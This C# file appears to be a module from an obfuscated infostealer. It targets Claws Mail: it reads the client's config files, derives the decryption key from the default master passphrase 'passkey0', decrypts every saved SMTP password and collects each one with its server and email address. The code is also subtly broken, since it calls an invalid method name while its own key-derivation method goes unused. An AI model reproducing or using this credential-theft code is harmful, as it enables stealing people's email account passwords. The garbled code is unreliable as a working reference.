using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using C6Zy;
using rCOGWW;

namespace rk937aHHc
{
	public class ClawsMail : EtbH
	{
		public ClawsMail()
		{
			this.UhCh7DgM7j = "ClawsMail";
		}

		public string UhCh7DgM7j { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> result = new List<WTitxI2m>();

            string clawsPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Claws-mail"
            );

            if (!Directory.Exists(clawsPath))
                return result;

            string clawsrcPath = Path.Combine(clawsPath, "clawsrc");
            if (!File.Exists(clawsrcPath))
                return result;

            string clawsrc = File.ReadAllText(clawsrcPath);

            string saltBase64 = Regex
                .Match(clawsrc, "master_passphrase_salt=(.+)")
                .Groups[1].Value;

            int pbkdf2Rounds = int.Parse(
                Regex.Match(clawsrc, "master_passphrase_pbkdf2_rounds=(.+)")
                     .Groups[1].Value
            );

            w3uoxlrf accountParser = new w3uoxlrf(
                Path.Combine(clawsPath, "accountrc")
            );

            Dictionary<string, WTitxI2m> accounts = new Dictionary<string, WTitxI2m>();

            foreach (string key in accountParser.Keys)
            {
                if (!key.ToLower().StartsWith("account"))
                    continue;

                string host = accountParser[key]["smtp_server"];
                string email = accountParser[key]["address"];

                accounts.Add(
                    "[" + key.ToLower().Replace(" ", "") + "]",
                    new WTitxI2m
                    {
                        data1 = host,
                        data2 = email
                    }
                );
            }

            string[] passwordLines = File.ReadAllLines(
                Path.Combine(clawsPath, "passwordstorerc")
            );

            const string masterKeyName = "passkey0";

            byte[] salt = Convert.FromBase64String(saltBase64);

            byte[] derivedKey = ClawsMail.4ev(
                masterKeyName,
                salt,
                pbkdf2Rounds,
                32
            );

            for (int i = 0; i < passwordLines.Length - 1; i++)
            {
                foreach (string accountKey in accounts.Keys)
                {
                    if (passwordLines[i] != accountKey)
                        continue;

                    string encryptedBase64 = Regex
                        .Match(passwordLines[i + 1], "{(.*),(.*)}(.*)")
                        .Groups[3].Value;

                    string password = ClawsMail.ecjsBI0qB(
                        Convert.FromBase64String(encryptedBase64),
                        derivedKey
                    ).Trim('\0');

                    accounts[accountKey].data3 = password;
                }
            }

            foreach (WTitxI2m acc in accounts.Values)
            {
                if (!string.IsNullOrEmpty(acc.data3) && acc.data3.Length > 1)
                {
                    result.Add(new WTitxI2m
                    {
                        data1 = acc.data1, // SMTP 서버
                        data2 = acc.data2, // 이메일
                        data3 = acc.data3, // 비밀번호
                        data4 = this.UhCh7DgM7j
                    });
                }
            }

            return result;
        }

        private static string ecjsBI0qB(byte[] cipherText, byte[] key)
        {
            byte[] iv = new byte[16];

            try
            {
                using (RijndaelManaged aes = new RijndaelManaged())
                {
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.None;

                    using (ICryptoTransform decryptor = aes.CreateDecryptor(key, iv))
                    {
                        byte[] decrypted = decryptor.TransformFinalBlock(
                            cipherText,
                            0,
                            cipherText.Length
                        );

                        return Encoding.UTF8.GetString(decrypted).Substring(16);
                    }
                }
            }
            catch
            {
                return null;
            }
        }

        private static byte[] DeriveKey(string password,byte[] salt,int iterations,int keyLength)
        {
            using (var pbkdf2 = new Rfc2898DeriveBytes(password, salt))
            {
                pbkdf2.IterationCount = iterations;
                return pbkdf2.GetBytes(keyLength);
            }
        }
    }
}
